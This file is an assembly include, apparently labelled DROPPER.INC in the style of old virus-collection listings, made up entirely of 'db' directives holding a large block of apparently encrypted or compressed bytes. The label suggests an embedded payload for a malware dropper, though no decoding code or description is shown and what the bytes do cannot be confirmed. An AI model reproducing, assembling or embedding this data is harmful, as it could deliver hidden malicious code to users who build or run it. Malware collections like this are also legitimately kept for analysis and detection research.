db 0C9h, 00Fh, 095h, 003h, 049h, 091h, 052h, 007h
db 058h, 050h, 0D4h, 00Fh, 04Fh, 02Eh, 06Eh, 0C0h
db 0EAh, 0D6h, 0E9h, 0E8h, 0ADh, 0C0h, 002h, 0A7h
db 082h, 057h, 007h, 07Ch, 07Bh, 0ECh, 0FDh, 0B3h
db 020h, 002h, 0F5h, 087h, 028h, 09Dh, 0D9h, 0F0h
db 03Dh, 0D6h, 0ADh, 0E8h, 0E5h, 016h, 03Eh, 0C7h
db 006h, 0E9h, 0F0h, 0DCh, 036h, 0F1h, 0E9h, 0D7h
db 079h, 006h, 01Ch, 0F4h, 0F5h, 0DAh, 05Ch, 0D4h
db 069h, 020h, 029h, 001h, 09Eh, 0E9h, 0B3h, 077h
db 0F1h, 08Eh, 00Ah, 0E9h, 0BEh, 088h, 06Eh, 03Ch
db 047h, 0D5h, 0F3h, 01Dh, 041h, 0FEh, 0ACh, 03Eh
db 00Ah, 082h, 0E3h, 0BDh, 082h, 0B6h, 0CFh, 04Ah
db 006h, 0F9h, 0B7h, 064h, 0E4h, 04Dh, 082h, 049h
db 040h, 0F7h, 065h, 0F1h, 036h, 0EFh, 019h, 083h
db 04Ah, 0F0h, 0BBh, 00Eh, 06Dh, 0F9h, 084h, 0BFh
db 086h, 099h, 0AEh, 0F3h, 082h, 0F4h, 0D2h, 0B3h
db 020h, 076h, 002h, 0F1h, 049h, 0A9h, 04Bh, 0B2h
db 050h, 08Ah, 0E6h, 0CAh, 03Eh, 0D4h, 020h, 04Ch
db 03Dh, 07Ch, 072h, 05Dh, 0CEh, 00Bh, 051h, 02Ch
db 057h, 00Eh, 0A7h, 0E9h, 0FDh, 0E9h, 08Ch, 0D4h
db 0CFh, 0B3h, 0E4h, 0F3h, 051h, 0D5h, 020h, 0F6h
db 0A0h, 040h, 07Ch, 057h, 051h, 007h, 0A3h, 0DEh
db 098h, 0F6h, 032h, 02Bh, 07Ah, 05Dh, 0E7h, 0B1h
db 021h, 044h, 0E9h, 0AEh, 094h, 03Eh, 0F4h, 020h
db 06Dh, 01Ah, 026h, 0C7h, 072h, 039h, 06Eh, 02Bh
db 03Ah, 072h, 01Dh, 032h, 05Fh, 0A7h, 0F9h, 055h
db 084h, 057h, 0EEh, 02Dh, 042h, 0C2h, 0ADh, 020h
db 0ACh, 0CBh, 028h, 047h, 007h, 01Eh, 071h, 0EBh
db 0CDh, 07Ch, 0CFh, 03Eh, 047h, 0AEh, 069h, 025h
db 011h, 0DAh, 00Fh, 060h, 0E8h, 054h, 041h, 036h
db 0F7h, 004h, 04Ah, 0DEh, 0BEh, 075h, 020h, 00Eh
db 0A9h, 0F1h, 034h, 020h, 06Fh, 04Eh, 046h, 0B2h
db 0DAh, 081h, 0EDh, 0AAh, 0F9h, 001h, 0A3h, 0A3h
db 096h, 0B4h, 048h, 0CFh, 011h, 092h, 04Ah, 063h
db 0ADh, 0A6h, 031h, 080h, 0A6h, 0F5h, 056h, 020h
db 07Ch, 050h, 007h, 0B9h, 032h, 0DDh, 006h, 0F6h
db 055h, 090h, 091h, 02Fh, 036h, 044h, 014h, 0ABh
db 0A3h, 0FDh, 05Bh, 020h, 070h, 073h, 0BBh, 0A2h
db 09Dh, 08Dh, 0C0h, 0A8h, 0E8h, 0EBh, 0F6h, 0F9h
db 043h, 0CFh, 051h, 0FEh, 012h, 0A1h, 00Eh, 058h
db 053h, 060h, 07Ch, 054h, 07Ch, 0BBh, 0F6h, 0E3h
db 047h, 09Fh, 06Dh, 0C4h, 0EEh, 08Dh, 0C4h, 046h
db 0CBh, 050h, 038h, 0EFh, 0F7h, 0A9h, 091h, 0CEh
db 046h, 020h, 0BCh, 037h, 032h, 0EBh, 02Bh, 01Dh
db 031h, 0EAh, 0A6h, 0CCh, 0F7h, 00Eh, 0FDh, 0A9h
db 088h, 0CEh, 033h, 0E2h, 081h, 06Ah, 041h, 024h
db 033h, 036h, 07Fh, 009h, 0D5h, 034h, 08Ah, 062h
db 032h, 032h, 05Dh, 0ADh, 0F0h, 0C4h, 0BEh, 0EEh
db 0EFh, 041h, 099h, 033h, 0FFh, 056h, 002h, 006h
db 06Ah, 0EBh, 004h, 001h, 03Fh, 048h, 067h, 08Eh
db 0ECh, 05Ch, 0F5h, 04Ah, 04Ah, 0A1h, 0F7h, 05Bh
db 09Dh, 02Bh, 0EAh, 0C5h, 092h, 043h, 0CCh, 017h
db 0FFh, 054h, 05Dh, 092h, 01Eh, 06Ah, 0E9h, 002h
db 0AAh, 024h, 0B1h, 0B3h, 0BEh, 0FFh, 051h, 0A4h
db 0AEh, 0B6h, 05Ch, 0F9h, 00Eh, 0DBh, 043h, 08Ah
db 026h, 080h, 0ADh, 065h, 063h, 0F1h, 0E7h, 085h
db 049h, 040h, 051h, 004h, 018h, 0E8h, 095h, 054h
db 01Bh, 0FAh, 0A4h, 0F6h, 0BDh, 0DBh, 002h, 070h
db 032h, 058h, 02Bh, 07Bh, 0D6h, 08Ah, 020h, 09Eh
db 036h, 09Ch, 03Ch, 09Ah, 01Ah, 091h, 0EBh, 028h
db 0B4h, 0DBh, 082h, 0A0h, 06Ch, 070h, 088h, 0AFh
db 0EAh, 0DCh, 0BFh, 037h, 0E8h, 026h, 0A7h, 078h
db 0EDh, 0BFh, 0ECh, 0E6h, 0E6h, 0E8h, 043h, 0DFh
db 081h, 066h, 04Ch, 0B8h, 07Dh, 0D3h, 025h, 027h
db 031h, 0BDh, 0B6h, 0C3h, 0CFh, 0C9h, 00Dh, 08Dh
db 060h, 0D5h, 0EFh, 0BFh, 0E9h, 055h, 0FBh, 0CBh
db 076h, 012h, 0A9h, 08Ah, 082h, 033h, 04Bh, 031h
db 0E9h, 0B3h, 0ECh, 0FFh, 0F3h, 074h, 01Eh, 04Dh
db 007h, 0BEh, 04Dh, 087h, 07Bh, 091h, 07Bh, 03Dh
db 06Dh, 084h, 02Eh, 054h, 060h, 095h, 090h, 01Fh
db 087h, 0DBh, 057h, 0E2h, 0C5h, 036h, 0B3h, 01Eh
db 090h, 065h, 092h, 07Bh, 0DAh, 037h, 0EAh, 063h
db 0E8h, 024h, 041h, 0ADh, 009h, 039h, 0EEh, 087h
db 0F6h, 036h, 019h, 0F3h, 099h, 04Eh, 0BAh, 0CCh
db 0E4h, 072h, 0FEh, 0F0h, 0FDh, 044h, 040h, 0D3h
db 01Fh, 0ECh, 0F3h, 0B3h, 033h, 0CCh, 0D6h, 025h
db 0ADh, 069h, 0BDh, 0D4h, 00Eh, 08Fh, 04Dh, 057h
db 050h, 031h, 0A1h, 0A8h, 01Ah, 040h, 0D9h, 0DAh
db 0A6h, 0E7h, 035h, 013h, 065h, 05Ah, 0FEh, 044h
db 003h, 0A1h, 0D0h, 0EBh, 0CAh, 0ADh, 0D3h, 002h
db 064h, 071h, 07Ch, 0FFh, 0B4h, 0C1h, 0D2h, 0DBh
db 0F9h, 049h, 09Ah, 06Ch, 003h, 08Eh, 0EFh, 0B0h
db 02Dh, 0CBh, 006h, 088h, 047h, 03Ch, 057h, 02Dh
db 027h, 01Ch, 020h, 019h, 0E6h, 0A6h, 09Eh, 0D2h
db 0BFh, 05Bh, 06Eh, 020h, 0B9h, 031h, 05Ch, 021h
db 093h, 0A9h, 008h, 020h, 0FEh, 053h, 0ECh, 001h
db 056h, 020h, 052h, 00Dh, 052h, 01Fh, 0CAh, 007h
db 001h, 0ABh, 020h, 0A9h, 00Eh, 02Bh, 022h, 028h
db 01Eh, 055h, 0F6h, 001h, 059h, 020h, 049h, 00Eh
db 0FDh, 0ECh, 059h, 03Eh, 0A5h, 019h, 08Ah, 004h
db 080h, 0D3h, 0FDh, 01Ah, 001h, 084h, 09Ah, 03Fh
db 08Fh, 01Eh, 0F2h, 0CBh, 027h, 053h, 00Dh, 06Ah
db 042h, 020h, 064h, 0F6h, 035h, 02Bh, 001h, 053h
db 020h, 0A7h, 0FFh, 0F1h, 0F7h, 018h, 0FCh, 0A7h
db 041h, 01Bh, 01Dh, 002h, 07Fh, 041h, 08Dh, 035h
db 083h, 066h, 021h, 03Dh, 0E6h, 016h, 0E3h, 049h
db 0DBh, 04Bh, 01Fh, 06Ah, 040h, 021h, 0EAh, 01Fh
db 0B9h, 06Ah, 082h, 022h, 044h, 0ECh, 09Ah, 040h
db 02Bh, 0F6h, 01Fh, 0A9h, 021h, 0A4h, 040h, 04Ah
db 021h, 05Ah, 091h, 020h, 016h, 019h, 023h, 01Dh
db 09Ah, 002h, 0B4h, 0C3h, 0A4h, 060h, 0ADh, 09Dh
db 0B8h, 048h, 003h, 0A7h, 008h, 0D3h, 085h, 07Dh
db 020h, 0C2h, 01Bh, 084h, 09Dh, 05Ah, 0A9h, 01Ch
db 040h, 053h, 053h, 027h, 004h, 09Fh, 0ABh, 080h
db 0EDh, 043h, 04Dh, 044h, 0A9h, 011h, 080h, 052h
db 045h, 064h, 06Ah, 0C0h, 0F2h, 094h, 0E1h, 09Bh
db 018h, 0BDh, 0D7h, 01Fh, 094h, 082h, 0DAh, 028h
db 065h, 067h, 035h, 018h, 079h, 01Fh, 04Dh, 020h
db 04Dh, 001h, 044h, 020h, 0CAh, 0C0h, 089h, 007h
db 01Ch, 071h, 0AFh, 020h, 0B7h, 0B1h, 035h, 0F6h
db 03Dh, 020h, 0FAh, 03Eh, 0D2h, 023h, 03Dh, 0D0h
db 049h, 0CDh, 0F2h, 0C7h, 004h, 0A9h, 05Dh, 035h
db 004h, 06Dh, 08Dh, 049h, 0AEh, 0E6h, 09Eh, 010h
db 0FDh, 05Fh, 0CDh, 06Bh, 0CDh, 036h, 060h, 0B1h
db 070h, 07Ah, 0C5h, 0D2h, 078h, 0FCh, 00Fh, 0C5h
db 098h, 0F8h, 007h, 05Dh, 004h, 0F1h, 01Eh, 03Fh
db 0F0h, 088h, 008h, 00Fh, 0E0h, 03Eh, 0A0h, 0C0h
db 043h, 003h, 0A5h, 019h, 01Ch, 009h, 00Fh, 046h
db 028h, 061h, 053h, 01Fh, 004h, 0E3h, 0FCh, 020h
db 099h, 0FEh, 06Ch, 07Fh, 009h, 0B7h, 0E0h, 0E8h
db 0F0h, 0A4h, 004h, 078h, 003h, 0D5h, 074h, 004h
db 036h, 0F8h, 04Ch, 0EBh, 0E5h, 03Bh, 06Fh, 027h
db 0F1h, 048h, 01Fh, 0C5h, 042h, 0C5h, 06Ch, 00Eh
db 0C3h, 042h, 013h, 019h, 08Fh, 047h, 048h, 04Ah
db 021h, 09Ch, 065h, 0A3h, 0E7h, 013h, 01Dh, 03Fh
db 046h, 0D6h, 040h, 0E1h, 005h, 027h, 021h, 038h
db 0D3h, 06Eh, 038h, 03Eh, 01Bh, 041h, 06Ah, 08Ah
db 00Ch, 021h, 056h, 0DBh, 03Eh, 034h, 0A5h, 066h
db 080h, 009h, 0D5h, 041h, 063h, 0A6h, 0F3h, 0D4h
db 02Dh, 02Fh, 0A5h, 079h, 041h, 0ABh, 07Fh, 08Eh
db 0CAh, 020h, 0B8h, 0C3h, 0DCh, 023h, 0D3h, 055h
db 0BEh, 020h, 0DAh, 092h, 05Ah, 096h, 020h, 0E9h
db 00Fh, 050h, 005h, 01Eh, 0A2h, 020h, 04Ah, 002h
db 095h, 020h, 091h, 042h, 055h, 0DAh, 049h, 020h
db 0E2h, 015h, 0B6h, 028h, 042h, 0ABh, 020h, 053h
db 0D1h, 020h, 0A5h, 037h, 019h, 08Ah, 020h, 06Dh
db 03Eh, 05Fh, 020h, 06Ah, 080h, 05Fh, 04Eh, 011h
db 0DAh, 040h, 0B4h, 0C1h, 0A6h, 061h, 0A5h, 07Fh
db 06Ah, 041h, 04Ah, 082h, 06Ah, 061h, 03Ch, 057h
db 03Fh, 0D5h, 021h, 0DAh, 007h, 092h, 001h, 0B6h
db 01Fh, 0A4h, 020h, 0A1h, 05Fh, 0C9h, 0C5h, 0CFh
db 0C4h, 06Ch, 042h, 0D5h, 03Ch, 020h, 0B4h, 095h
db 0FFh, 048h, 020h, 0BCh, 035h, 043h, 024h, 03Eh
db 0DFh, 022h, 053h, 0C5h, 074h, 053h, 0BCh, 040h
db 05Ah, 0CBh, 0EFh, 0DAh, 089h, 08Dh, 080h, 041h
db 0ADh, 03Eh, 0CDh, 00Dh, 06Ch, 0C5h, 0CFh, 0B7h
db 03Dh, 02Bh, 0B7h, 043h, 00Eh, 010h, 0FFh, 094h
db 022h, 0ABh, 04Fh, 02Eh, 052h, 0F5h, 032h, 001h
db 0FEh, 0E9h, 00Fh, 0C0h, 0AEh, 01Eh, 030h, 08Bh
db 03Fh, 0FCh, 0B1h, 044h, 00Fh, 072h, 08Ch, 095h
db 004h, 097h, 07Fh, 094h, 074h, 084h, 0B9h, 098h
db 04Ch, 089h, 03Fh, 096h, 068h, 043h, 0C0h, 003h
db 0BDh, 0CDh, 0E4h, 0F6h, 02Fh, 0CCh, 081h, 009h
db 0C0h, 089h, 0F1h, 05Ch, 077h, 042h, 0AFh, 09Fh
db 0C7h, 042h, 01Ah, 004h, 032h, 00Bh, 0CBh, 08Eh
db 001h, 008h, 013h, 0B8h, 021h, 0DFh, 029h, 017h
db 0BAh, 0D3h, 040h, 055h, 01Eh, 0C2h, 093h, 020h
db 084h, 065h, 025h, 040h, 065h, 0E1h, 076h, 03Fh
db 046h, 0A6h, 041h, 0AEh, 0FAh, 091h, 001h, 04Eh
db 014h, 03Fh, 092h, 087h, 0B2h, 03Ah, 020h, 064h
db 0FFh, 06Dh, 04Ch, 021h, 00Bh, 0D4h, 007h, 01Fh
db 0F3h, 0D9h, 08Ch, 099h, 045h, 051h, 082h, 090h
db 00Ah, 0C5h, 00Bh, 055h, 001h, 066h, 05Fh, 033h
db 06Eh, 0D9h, 003h, 00Dh, 0FBh, 066h, 09Ch, 018h
db 090h, 05Ch, 00Fh, 069h, 01Fh, 02Bh, 041h, 0B5h
db 032h, 037h, 020h, 08Dh, 0ADh, 046h, 020h, 042h
db 055h, 00Ah, 001h, 0C2h, 0B1h, 0C0h, 0FBh, 04Ch
db 020h, 013h, 0DAh, 012h, 06Dh, 096h, 020h, 0EDh
db 09Bh, 03Bh, 0EDh, 02Ah, 092h, 013h, 09Ah, 020h
db 0AAh, 021h, 041h, 03Ah, 052h, 01Fh, 066h, 055h
db 0EDh, 041h, 047h, 013h, 02Ah, 019h, 021h, 051h
db 090h, 001h, 0B2h, 083h, 054h, 00Fh, 092h, 020h
db 0CAh, 010h, 09Ah, 020h, 0AEh, 021h, 051h, 056h
db 0A0h, 055h, 01Fh, 0CAh, 02Ah, 020h, 038h, 040h
db 01Fh, 0A6h, 021h, 0E7h, 05Dh, 0C0h, 0A9h, 03Ah
db 01Fh, 09Ch, 01Fh, 012h, 0D9h, 08Dh, 02Fh, 0A9h
db 043h, 022h, 0CAh, 01Fh, 0CEh, 03Ch, 020h, 052h
db 0D9h, 021h, 09Ch, 0E2h, 0ABh, 001h, 0E4h, 055h
db 01Fh, 09Ch, 06Bh, 021h, 02Bh, 022h, 0A9h, 01Eh
db 02Bh, 01Fh, 0B9h, 0ABh, 00Ah, 021h, 039h, 0C5h
db 0CEh, 09Ah, 01Eh, 096h, 01Fh, 0E3h, 049h, 021h
db 05Dh, 022h, 055h, 01Eh, 076h, 01Fh, 043h, 0A6h
db 063h, 0A2h, 022h, 0E5h, 068h, 029h, 01Fh, 06Ah
db 001h, 0B8h, 052h, 022h, 0D4h, 01Eh, 0DCh, 021h
db 0CAh, 021h, 06Ah, 022h, 0ABh, 01Eh, 038h, 052h
db 05Ah, 052h, 022h, 0B6h, 03Ch, 0A7h, 09Ah, 029h
db 01Fh, 04Dh, 018h, 02Eh, 08Eh, 0CDh, 051h, 014h
db 05Eh, 040h, 051h, 00Dh, 0ABh, 03Ch, 079h, 0EAh
db 001h, 079h, 013h, 0B5h, 004h, 007h, 02Ah, 018h
db 057h, 049h, 055h, 0FFh, 04Bh, 01Fh, 09Ah, 002h
db 0BAh, 01Eh, 0B9h, 022h, 00Ah, 05Eh, 040h, 09Ah
db 069h, 0BFh, 080h, 014h, 00Ah, 0A2h, 0F9h, 0A9h
db 0FEh, 001h, 0F4h, 0E1h, 01Eh, 0EEh, 023h, 012h
db 010h, 0E3h, 070h, 085h, 0C7h, 03Dh, 01Ah, 01Eh
db 0EFh, 02Dh, 07Fh, 003h, 0C2h, 036h, 020h, 0FBh
db 03Dh, 071h, 00Ch, 045h, 0E3h, 0DAh, 002h, 079h
db 07Fh, 01Bh, 084h, 038h, 037h, 080h, 0FBh, 00Ch
db 0A4h, 01Dh, 0A2h, 020h, 08Ah, 001h, 021h, 071h
db 037h, 045h, 001h, 065h, 01Eh, 053h, 020h, 014h
db 0A6h, 021h, 0B6h, 07Bh, 0C8h, 041h, 00Ch, 04Dh
db 04Ah, 059h, 01Fh, 09Ch, 003h, 01Ch, 06Bh, 03Eh
db 0B5h, 042h, 015h, 01Dh, 020h, 0D4h, 001h, 08Dh
db 016h, 042h, 05Dh, 05Eh, 0D6h, 09Bh, 03Dh, 0BDh
db 029h, 020h, 07Ch, 0CAh, 051h, 020h, 0B9h, 079h
db 052h, 020h, 06Ah, 085h, 07Fh, 053h, 052h, 041h
db 021h, 029h, 037h, 060h, 094h, 0E3h, 080h, 0A9h
db 05Dh, 020h, 045h, 03Fh, 036h, 020h, 00Dh, 0A7h
db 060h, 036h, 002h, 040h, 055h, 031h, 03Fh, 0D6h
db 094h, 0DDh, 0D5h, 042h, 020h, 0E5h, 015h, 021h
db 020h, 092h, 054h, 024h, 060h, 0F7h, 048h, 035h
db 043h, 034h, 040h, 08Ah, 05Fh, 052h, 020h, 08Eh
db 010h, 011h, 09Ah, 0C5h, 0AAh, 07Bh, 0E0h, 0DBh
db 0C5h, 036h, 020h, 042h, 048h, 0FBh, 060h, 0B4h
db 09Eh, 020h, 04Eh, 0B7h, 0A8h, 055h, 062h, 05Dh
db 020h, 023h, 061h, 092h, 02Dh, 0A1h, 0B6h, 042h
db 044h, 0C1h, 093h, 0A0h, 06Ah, 01Fh, 05Ah, 087h
db 021h, 0FBh, 038h, 024h, 061h, 071h, 073h, 0B8h
db 003h, 046h, 0DAh, 044h, 0CBh, 0B2h, 06Fh, 045h
db 00Dh, 034h, 01Eh, 0A9h, 052h, 001h, 00Ah, 0BBh
db 022h, 085h, 02Ah, 001h, 0EAh, 021h, 0FFh, 042h
db 0E0h, 007h, 071h, 0EEh, 012h, 0FCh, 0A2h, 084h
db 0E2h, 080h, 007h, 001h, 049h, 0D9h, 051h, 0F2h
db 0B2h, 01Ch, 0D1h, 00Ch, 0EAh, 040h, 02Dh, 014h
db 000h, 0D5h, 0B1h, 001h, 0B9h, 04Ah, 0A1h, 0E2h
db 0F6h, 00Eh, 070h, 09Ah, 00Ch, 092h, 004h, 05Ch
db 060h, 043h, 007h, 0D7h, 06Fh, 002h, 0B2h, 0D4h
db 062h, 05Ah, 087h, 029h, 0FDh, 005h, 057h, 027h
db 05Fh, 0BAh, 00Bh, 08Ah, 010h, 020h, 0B5h, 021h
db 01Bh, 020h, 060h, 0FDh, 0A8h, 051h, 0DFh, 0A8h
db 021h, 0FFh, 03Ah, 035h, 020h, 05Bh, 021h, 002h
db 028h, 040h, 0EBh, 014h, 0ABh, 061h, 053h, 037h
db 021h, 06Ah, 007h, 020h, 039h, 0BAh, 0F9h, 0C5h
db 0F7h, 0ECh, 067h, 04Eh, 0B0h, 0D4h, 02Ah, 0D5h
db 020h, 010h, 0DCh, 0F9h, 04Eh, 096h, 01Bh, 041h
db 06Dh, 00Fh, 026h, 008h, 046h, 062h, 011h, 0D4h
db 00Ah, 041h, 0D4h, 020h, 06Ah, 0CCh, 09Fh, 04Dh
db 038h, 0C7h, 055h, 007h, 044h, 04Dh, 0A3h, 0E6h
db 085h, 041h, 0F9h, 025h, 020h, 059h, 052h, 038h
db 017h, 0C7h, 0A2h, 0F6h, 09Ah, 020h, 08Ah, 060h
db 020h, 0EFh, 014h, 0CDh, 061h, 0E3h, 00Ah, 017h
db 096h, 0C7h, 09Eh, 0BFh, 0A4h, 020h, 0D9h, 063h
db 040h, 0F9h, 01Dh, 0B6h, 0C2h, 05Ah, 042h, 0DCh
db 03Eh, 09Bh, 06Ch, 0B5h, 052h, 01Bh, 020h, 0DCh
db 061h, 0A8h, 015h, 033h, 06Ch, 02Ah, 003h, 096h
db 051h, 012h, 002h, 0FAh, 08Dh, 020h, 0DEh, 0CBh
db 056h, 043h, 040h, 04Eh, 0CDh, 0E2h, 057h, 01Fh
db 0FAh, 006h, 029h, 020h, 0EFh, 0F3h, 0A1h, 098h
db 0D6h, 093h, 001h, 0D5h, 035h, 00Bh, 03Dh, 020h
db 047h, 015h, 0FBh, 0E3h, 092h, 07Ah, 024h, 0AAh
db 001h, 0ACh, 064h, 022h, 0F9h, 0A6h, 020h, 0ABh
db 021h, 072h, 03Bh, 0A4h, 021h, 0DAh, 013h, 043h
db 09Ch, 020h, 0E7h, 0F2h, 08Dh, 01Dh, 044h, 05Dh
db 007h, 049h, 083h, 0D3h, 0FDh, 02Dh, 020h, 025h
db 0E8h, 0ABh, 03Bh, 007h, 037h, 043h, 0A8h, 028h
db 0D6h, 0A5h, 020h, 0BEh, 0C6h, 078h, 085h, 02Ah
db 0A2h, 0D4h, 040h, 060h, 0F5h, 03Dh, 001h, 095h
db 07Ch, 0F6h, 020h, 072h, 08Ch, 0A9h, 021h, 0F6h
db 049h, 003h, 0DEh, 0A9h, 03Fh, 02Eh, 0E9h, 0AAh
db 0DCh, 040h, 0EEh, 09Ah, 02Fh, 0A9h, 019h, 02Ah
db 0AAh, 01Eh, 026h, 00Eh, 06Ah, 01Fh, 02Bh, 040h
db 029h, 082h, 028h, 044h, 090h, 0E3h, 0D3h, 03Fh
db 037h, 089h, 03Dh, 03Bh, 0CAh, 0BBh, 060h, 0AAh
db 007h, 094h, 001h, 0D4h, 038h, 01Fh, 0DCh, 0E9h
db 080h, 0CDh, 0E3h, 0AAh, 0E0h, 002h, 0F1h, 056h
db 01Eh, 03Fh, 0A5h, 020h, 06Dh, 006h, 059h, 024h
db 059h, 01Fh, 04Eh, 060h, 029h, 0F6h, 004h, 035h
db 084h, 066h, 07Ch, 003h, 056h, 0D7h, 020h, 069h
db 045h, 0D9h, 09Eh, 045h, 0F9h, 029h, 001h, 04Bh
db 020h, 06Ah, 0C9h, 01Eh, 0F3h, 053h, 03Eh, 020h
db 099h, 003h, 0DCh, 015h, 054h, 019h, 007h, 08Ah
db 0D7h, 020h, 0F3h, 0FCh, 055h, 01Bh, 056h, 01Fh
db 073h, 094h, 042h, 0F5h, 071h, 0EDh, 05Fh, 020h
db 0B5h, 07Fh, 021h, 029h, 0F7h, 02Ah, 04Dh, 003h
db 055h, 007h, 068h, 020h, 01Bh, 0D5h, 086h, 04Ah
db 0D2h, 01Fh, 077h, 0B6h, 002h, 043h, 0D4h, 006h
db 015h, 0DBh, 00Ch, 052h, 025h, 032h, 07Bh, 09Ah
db 030h, 071h, 0ECh, 091h, 0DFh, 0CAh, 022h, 0B6h
db 008h, 024h, 0D4h, 042h, 02Eh, 08Fh, 0FFh, 05Bh
db 011h, 038h, 044h, 05Dh, 0CAh, 033h, 09Ch, 01Bh
db 055h, 01Eh, 040h, 0FFh, 06Ah, 042h, 004h, 05Ch
db 0B6h, 042h, 08Dh, 0ACh, 03Fh, 0D4h, 0D3h, 040h
db 0DBh, 060h, 055h, 044h, 045h, 04Dh, 063h, 043h
db 041h, 00Eh, 06Fh, 002h, 028h, 075h, 013h, 06Ah
db 081h, 04Dh, 03Fh, 0D1h, 001h, 0F6h, 096h, 040h
db 02Ah, 00Eh, 05Dh, 061h, 0A4h, 040h, 0D4h, 0E1h
db 015h, 07Dh, 0A6h, 03Fh, 0FFh, 009h, 052h, 040h
db 0F7h, 033h, 0EDh, 01Bh, 005h, 034h, 052h, 026h
db 03Fh, 09Bh, 01Eh, 0F5h, 022h, 0FFh, 0D3h, 09Ch
db 040h, 0D5h, 07Eh, 07Fh, 094h, 071h, 07Dh, 0A9h
db 09Fh, 0D3h, 0FDh, 0D1h, 059h, 040h, 0B5h, 032h
db 022h, 02Dh, 03Fh, 0CAh, 093h, 020h, 089h, 0D1h
db 007h, 0CAh, 09Ch, 040h, 0A5h, 03Fh, 02Ah, 0A0h
db 0ABh, 040h, 03Ah, 002h, 0FFh, 06Dh, 065h, 07Fh
db 0C7h, 094h, 069h, 055h, 0A0h, 035h, 040h, 055h
db 001h, 03Fh, 0A6h, 061h, 0FBh, 022h, 050h, 053h
db 040h, 072h, 0A3h, 026h, 0E7h, 00Ah, 03Fh, 052h
db 0AAh, 07Fh, 0FFh, 0B7h, 081h, 0C8h, 0CDh, 054h
db 0F2h, 092h, 040h, 093h, 03Fh, 0A5h, 033h, 0DFh
db 0EDh, 052h, 0BCh, 040h, 0D4h, 03Fh, 0F4h, 08Dh
db 01Fh, 094h, 068h, 0D1h, 040h, 0B2h, 0EDh, 012h
db 0B2h, 03Fh, 08Ah, 07Fh, 09Fh, 029h, 040h, 0CAh
db 03Fh, 054h, 0A7h, 040h, 0B5h, 01Ch, 069h, 03Fh
db 0ABh, 03Eh, 040h, 04Eh, 011h, 0D4h, 03Fh, 092h
db 054h, 01Dh, 021h, 094h, 040h, 0A4h, 0D8h, 09Eh
db 0F9h, 0A4h, 03Fh, 0E3h, 032h, 081h, 095h, 040h
db 093h, 02Dh, 0A7h, 0E2h, 066h, 005h, 0A4h, 0FEh
db 0A5h, 022h, 035h, 003h, 09Ah, 00Ah, 07Bh, 0B3h
db 017h, 069h, 0ABh, 0F8h, 015h, 029h, 0BFh, 05Ah
db 02Fh, 000h, 0A2h, 0CFh, 096h, 004h, 01Fh, 0C7h
db 0F8h, 003h, 09Dh, 0C1h, 038h, 009h, 00Fh, 080h
db 0F0h, 0E1h, 0FCh, 030h, 00Dh, 0C2h, 097h, 004h
db 029h, 001h, 059h, 001h, 05Bh, 004h, 021h, 003h
db 0E3h, 007h, 0C0h, 0F3h, 0F0h, 0A7h, 02Dh, 0B6h
db 0E1h, 0FCh, 0EBh, 056h, 0CEh, 078h, 060h, 000h
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[DROPPER.INC]컴�
